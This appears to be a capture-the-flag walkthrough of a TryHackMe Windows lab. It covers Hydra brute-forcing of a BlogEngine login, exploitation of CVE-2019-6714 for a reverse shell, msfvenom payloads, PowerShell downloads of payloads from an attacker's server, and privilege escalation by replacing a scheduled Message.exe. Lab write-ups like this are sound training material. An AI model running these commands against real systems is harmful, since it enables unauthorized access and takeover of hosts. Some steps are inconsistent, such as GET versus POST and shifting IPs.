# TryHackMe: Deploy the vulnerable Windows machine
This room will cover brute-forcing an accounts credentials, handling public exploits, using the Metasploit framework and privilege escalation on Windows.

#### [Task 1]  Deploy the vulnerable Windows machine

**Whats the name of the clown displayed on the homepage?**

Pennywise

#### [Task 2] Using Hydra to brute-force a login
  
We need to find a login page to attack and identify what type of request the form is making to the webserver. Typically, web servers make two types of requests, a **GET** request which is used to request data from a webserver and a **POST** request which is used to send data to a server.

To find the login page install gobuster(if it is not installed in your machine) and run the command `gobuster dir -u http://10.10.122.6 -w /usr/share/wordlists/dirb/common.txt`.The output of this command is shown below/

<img width="915" alt="1" src="https://user-images.githubusercontent.com/28839345/165507753-b8910a1a-63ab-4eab-8c1e-a761a9ba40db.png">

<img width="700" alt="2" src="https://user-images.githubusercontent.com/28839345/165507776-67ec8113-208d-40b5-b3a5-4d09f4538e1b.png">

There is a directory called '/admin'.Type 'http://10.10.122.6/admin' and you will be redirected to the following page 

<img width="1267" alt="3" src="https://user-images.githubusercontent.com/28839345/165507783-5837aa88-8f0b-4a06-a374-f75037b24876.png">

We need to find a login page to attack and identify what type of request the form is making to the webserver. Typically, web servers make two types of requests, a **GET** request which is used to request data from a webserver and a **POST** request which is used to send data to a server.

You can check what request a form is making by right clicking on the login form, inspecting the element and then reading the value in the method field. You can also identify this if you are intercepting the traffic through BurpSuite.

**What request type is the Windows website login form using?**

To check the request types of the website login form you can open burp suite and enable foxy proxy on your browser.Next type in the 'Username' and 'Password' a random value and type Login while burp suite is enable.Go to the Proxy tab and check the packet captured.

<img width="1238" alt="4" src="https://user-images.githubusercontent.com/28839345/165507788-a54c852a-b586-4859-a0e1-7421269ed4c8.png">

<img width="925" alt="5" src="https://user-images.githubusercontent.com/28839345/165507790-2711bbea-880a-449e-8fa3-d7b60e2c06e7.png">

From the header you can see that the request type is 'POST'.

<img width="1134" alt="6" src="https://user-images.githubusercontent.com/28839345/165507796-5d4e9607-656e-4d2a-955a-323c51dec6a4.png">

Now we know the request type and have a URL for the login form, we can get started brute-forcing an account.  

Directory/Path to Login Page

<img width="924" alt="7" src="https://user-images.githubusercontent.com/28839345/165507806-5a447eef-968f-4464-84c9-5783b6067273.png">

Request Body for Username/Password

<img width="924" alt="8" src="https://user-images.githubusercontent.com/28839345/165507810-a829e198-2b6d-447e-b8e2-722f48a3e13a.png">

The way to identify the Failed attampths will be the phrase 'Login failed'

<img width="1207" alt="9" src="https://user-images.githubusercontent.com/28839345/165507814-c2b45127-77a7-4068-bdc4-c152a4f81f1b.png">

To brute force successfully  a log in page using hydra you need to privide Hydra with the following:

1. Login or Wordlists for Usernames 
3. Password or Wordlist for Passwords 
4. IP address or Hostname
5. HTTP Method (POST/GET)
6. Directory/Path to Login Page
7.  Request Body for Username/Password
8. A way to Identify Failed Attempts

1. Provide hydra with the login username 'admin'
2. The wordlist for passwords will be '/usr/share/wordlists/rockyou.txt'
3. IP address will be the IP of the MACHINE running the web server
4. The HTTP method is GET
5. The directory path will be '/Account/login.aspx'
6. The request body will be `__VIEWSTATE=23ze5FbqcNXSMRY3uH%2Fyu34CLzAN0shWj49xxziH%2BbtuLIH%2B2MRFh0cxN5DDYpdbc%2Fsc3hiw%2Bk4%2B5Tr85i%2BWizg0GKHTg7Bsm0byBSuHo9%2BHkuwuBB2Eo%2BJeIZLEDmHQAMLk9NXRdZt7XRsPcfdK0WS65eNnsYyueqe0ZhWA0cPMdj1ljSWuHJkZWpwDWlfCkBRhryNe6%2BpBtctz5d%2FIOp%2FDwk1MlZwmozB3keq%2BfQxzyD7U9b7yzbGIs42s5jKe%2F25DuzmLulJfp9Pjr6n5pO6Mwu4r8%2FI8gv6PhmOTi3JIYzNc801B7UyLtbj8LRmCDf0EftsfX0PNS3jp8DWDLM9Grp27YQMt34SfY6jAqm8trIpx&__EVENTVALIDATION=ECHptmyz5l44sYbADg2mgle7nfU2jCpqzDJgSXeGbjWZ7vKuKb6tTBie18%2BG5mJkfJI%2FetapdZ0KuVcd1kb%2BetkuPQE55X1KHvJ46kb9NW9f6gMsWr%2BIdG4Wo5LFPO1iOKrYG8pULOKdhUzT0ghnPsxZdo3KB3J7rTUfcebT7OKWDvHH&ctl00%24MainContent%24LoginUser%24UserName=testUsername&ctl00%24MainContent%24LoginUser%24Password=testPassword&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in`
7. The way to identify the Failed attampths will be the phrase 'Login failed'

Finall hydra command: 

`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.101.85 http-post-form 
"/Account/login.aspx:__VIEWSTATE=23ze5FbqcNXSMRY3uH%2Fyu34CLzAN0shWj49xxziH%2BbtuLIH%2B2MRFh0cxN5DDYpdbc%2Fsc3hiw%2Bk4%2B5Tr85i%2BWizg0GKHTg
7Bsm0byBSuHo9%2BHkuwuBB2Eo%2BJeIZLEDmHQAMLk9NXRdZt7XRsPcfdK0WS65eNnsYyueqe0ZhWA0cPMdj1ljSWuHJkZWpwDWlfCkBRhryNe6%2BpBtctz5d%2FIOp%2FDwk1MlZwmozB3k
eq%2BfQxzyD7U9b7yzbGIs42s5jKe%2F25DuzmLulJfp9Pjr6n5pO6Mwu4r8%2FI8gv6PhmOTi3JIYzNc801B7UyLtbj8LRmCDf0EftsfX0PNS3jp8DWDLM9Grp27YQMt34SfY6jAqm8trIpx&__EV
ENTVALIDATION=ECHptmyz5l44sYbADg2mgle7nfU2jCpqzDJgSXeGbjWZ7vKuKb6tTBie18%2BG5mJkfJI%2FetapdZ0KuVcd1kb%2BetkuPQE55X1KHvJ46kb9NW9f6gMsWr%2BIdG4Wo5LFPO1iOK
rYG8pULOKdhUzT0ghnPsxZdo3KB3J7rTUfcebT7OKWDvHH&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%
24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"`

<img width="1293" alt="10" src="https://user-images.githubusercontent.com/28839345/165507816-49cdda51-5c28-4ebd-8350-52a8543ebf2f.png">

**Guess a username, choose a password wordlist and gain credentials to a user account!**

1qaz2wsx

[Task 3]  Compromise the machine

In this task, you will identify and execute a public exploit (from [exploit-db.com](http://www.exploit-db.com/)) to get initial access on this Windows machine!

Exploit-Database is a CVE (common vulnerability and exposures) archive of public exploits and corresponding vulnerable software, developed for the use of penetration testers and vulnerability researches. It is owned by Offensive Security (who are responsible for OSCP and Kali)

**Now you have logged into the website, are you able to identify the version of the BlogEngine?**

 3.3.6.0
 
Go the "About" section of the menu and you will see the version of the BlogEngine.     

<img width="1252" alt="11" src="https://user-images.githubusercontent.com/28839345/165507820-be3035fa-b534-4d1d-9b86-bffb1bb8837d.png">

Use the exploit database archive (http://www.exploit-db.com/) to find an exploit to gain a reverse shell on this system.

To exploit tha database first you need to find the CVE and download it.

Then modify the CVE and change the ip address and port the your Attcker machines ip address and the port you want to recieve the connction from.

<img width="1254" alt="12" src="https://user-images.githubusercontent.com/28839345/165507824-73aa35ed-1d70-46d4-a8c3-6bcb40ab3d3a.png">

Start nc listener as shown in the image below based on your Attackers machine ip and the port you want to listen to

<img width="499" alt="13" src="https://user-images.githubusercontent.com/28839345/165507827-8a950f02-9b86-4449-868a-4ddb42e65022.png">

Then go to  http://10.10.70.1/admin/app/editor/editpost.cshtml and upload the exploit.You must name the exploit 'PostView.ascx'.

<img width="1307" alt="14" src="https://user-images.githubusercontent.com/28839345/165507829-ba46b191-fbe1-4023-bae1-81a64b28349c.png">

<img width="1170" alt="15" src="https://user-images.githubusercontent.com/28839345/165507833-a507c8ea-1a85-413c-80fe-ab705434b6f0.png">

While you netcat listener is running go to http://10.10.70.1/?theme=../../App_Data/files and you will get a reverse shell to the web server.

<img width="469" alt="16" src="https://user-images.githubusercontent.com/28839345/165507837-4ae85a6d-d9a3-4e24-af58-3734054c9a0c.png">


**What is the CVE?**

CVE-2019-6714

Who is the webserver running as?

Run the `command whoami`

<img width="482" alt="17" src="https://user-images.githubusercontent.com/28839345/165507841-01bb6d78-bddb-411b-a9a8-49920a4635d1.png">

Create an msfvenom payload.

<img width="986" alt="18_msfvenom" src="https://user-images.githubusercontent.com/28839345/165507842-9bd11dbf-30fe-4117-89c7-598d124eda56.png">

Start an http server as show below using the command 
`python3 -m http.server` to upload the msfvenom reverse shell to netcat listener reverse shell.

<img width="688" alt="19_python-http-servet" src="https://user-images.githubusercontent.com/28839345/165507845-4ef671d0-0b38-49ef-9fb3-3ba642b1855a.png">

Then go to the 'C"\Windows\Temp' directory and downlaod the reverse shell from the http server using the command 
`wget "http://10.10.107.62:8000/reverse_shell.exe" -outfile "reverse_shell.exe"`.

- Metasploit commands to run a mult/handler
`use exploit/multi/handler`  
`set PAYLOAD windows/meterpreter/reverse_tcp`  
`set LHOST 10.10.83.129   
`set LPORT 4445`  
`run`

<img width="920" alt="21_running_msf_shell" src="https://user-images.githubusercontent.com/28839345/165507851-42bd33b0-33be-45d8-a8e2-44d42b27219b.png">

Then in your netcat listener start the reverse shell with the command `reverse_shell.exe`.

<img width="460" alt="22_running_reverse_shell" src="https://user-images.githubusercontent.com/28839345/165507859-c0879959-692e-44c5-8322-d0d6d95e9c90.png">

If you followed the previous steps successfully then a meterpreter shell will be spawned as shown in the picture below.

<img width="977" alt="23_spawn_multi_handler" src="https://user-images.githubusercontent.com/28839345/165507860-f7470aa4-6acf-4835-b669-6318142bc8d9.png">

Then run the `sysinfo` command to check the systems specifications.

<img width="672" alt="24_sysinfo" src="https://user-images.githubusercontent.com/28839345/165507865-861c59a4-12af-4c5f-929c-4e650132f49d.png">

To enumerate the windows machine download 'winPEASEx64.exe' from github to the windows machine and start the executable.

Run the command `winPEASx64.exe servicesinfo` .Scroll down and you will see the following output.

<img width="1337" alt="25_winPEASx64 exe_servicesinfo" src="https://user-images.githubusercontent.com/28839345/165507868-522b02a6-bb4c-4e8f-8033-767449c36219.png">


To check the running tasks of the system scheduler first navigate to the directory

`c:\Program Files (x86)\SystemScheduler`.The task that can be used to escalate our priviledges is the Message.exe file.The way I found out that this is the file that can be used to escalate our priviledges and spawn a reverse shell is 
that adter running a couple of times the command `tasklist /v` I saw that this file was executed every 30 seconds.The output of the `tasklist /v` command is shown below.

<img width="1137" alt="26_tasklist_:v" src="https://user-images.githubusercontent.com/28839345/165507871-6884fcc7-1ba3-49dc-9916-80133d165022.png">

<img width="1076" alt="27" src="https://user-images.githubusercontent.com/28839345/165507874-d66eb5b2-3622-4e99-811b-afd8268d02af.png">

Start a netcat lister


Start metapsloit and run the following commands to enable the multi/handler which will be used to create a more stabilzed shell.

**What is the OS version of this windows machine?** 

Windows 2012 R2 (6.3 Build 9600)

Further enumerate the machine.

**What is the name of the abnormal service running?**

WindowsScheduler

**What is the name of the binary you're supposed to exploit?**

Message.exe

**Using this abnormal service, escalate your privileges!**

WindowsScheduler


#### [Task 4] Windows Privilege Escalation

Exploit url

- Go to the following url to upload the exploit
`http://10.10.98.79/admin/app/editor/editpost.cshtml`

- Run the exploit by going to the following path
 `http://10.10.98.79/?theme=../../App_Data/files`

- Create a reverse_shell using metasploit
`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.107.62 LPORT=4444 -f exe -o reverse_shell.exe`

- Metasploit commands to run a mult/handler
`use exploit/multi/handler`  
`set PAYLOAD windows/meterpreter/reverse_tcp`  
`set LHOST 10.10.83.129   
`set LPORT 4445`  
`run`


- Powershell command to download a reverse_shell from an http server
`powershell -c wget  "http://10.10.107.62:8000/reverse_shell.exe" -outfile "reverse_shell.exe"`

- Run it
`reverse_shell.exe`


#### [Task 4] Windows Priviledge Escalation

--------------Upload winPEAS0x64.exe

First of all you need to download winPEASx64.exe to your local machine.

Then upload it to you meterpreter shell.

Copy winPEAS to meterpreter with the command
`powershell -c "Invoke-WebRequest -Uri 'http://10.10.107.62:8000/Desktop/winPEASx64.exe' -OutFile 'C:\Windows\Temp\winPEASx64.exe' "

Run winPEAS and check if there are is any usefull information to help you escalate your priviledges.

<img width="1337" alt="25_winPEASx64 exe_servicesinfo" src="https://user-images.githubusercontent.com/28839345/165507868-522b02a6-bb4c-4e8f-8033-767449c36219.png">

As you can see there is a programm running in SystemScheduler which may be usefull to us.
Possibly hijacking 
"C:\Program Files (x86)\SystemScheduler" 
You can use the `TASKLIST` command to **display a list of currently-running tasks** as show in the below picture

<img width="1076" alt="27" src="https://user-images.githubusercontent.com/28839345/165507874-d66eb5b2-3622-4e99-811b-afd8268d02af.png">

<img width="574" alt="28" src="https://user-images.githubusercontent.com/28839345/165507881-4efff9e2-13c6-4e64-b864-1be9d8c95657.png">

The next step is to create a new reverse_shell 
Spawn a reverse shell to 4449 
`nc -nlvp 4449`

- Create the msfvenom payload to your machine and name it 'Message.exe'.
`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.83.129 LPORT=4446 -f exe -o Message.exe`

- Upload the reverse shell  'Message.exe' to meterpreter shell  to the directory "C:\Program Files (x86)\SystemScheduler" and wait for it to run.
`powershell -c wget  "http://10.10.107.62:8000/Message.exe" -outfile "Message.exe"`

You will finally get a reverse shell as shown bellow.

<img width="574" alt="28" src="https://user-images.githubusercontent.com/28839345/165507881-4efff9e2-13c6-4e64-b864-1be9d8c95657.png">

**Using winPeas, what was the Original Install time? (This is date and time)**

<img width="648" alt="30_systeminfo" src="https://user-images.githubusercontent.com/28839345/165507887-1f42d875-81fb-46b0-989d-f4c20d6a7639.png">

8/3/2019, 10:43:23 AM







